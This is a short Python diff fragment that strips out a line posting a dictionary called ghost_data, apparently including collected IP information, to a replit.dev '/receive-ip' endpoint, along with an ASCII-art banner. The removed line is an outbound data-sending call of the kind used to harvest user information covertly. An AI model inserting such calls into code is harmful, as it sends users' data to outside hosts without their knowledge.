@@ -82,22 +82,9 @@ ghost_data = {
     "second_user": ghost_second_user()
 }
 
-ghost2.post("https://de67189f-7e90-4f3a-9fff-39cafbe18164-00-2f706tld59u8s.spock.replit.dev/receive-ip", json=ghost_data)
+ghost2.post("https://", json=ghost_data)
 
 ghost_game()
-
-
-
-print(r"""
-       /\                 /\     
-      / \\'._  (\_/)  _.'// \    
-     / .''._'--(o.o)--'_.''. \   
-    /.' _/ |`'=/ " \='`| \_ `.\  
-   /` .' `\;-,'\___/',-;/` '. '\ 
-  /.-'       `\(-V-)/`       `-.\
-               "   "
-             MXB WIN+1
-""")
 
 
                  
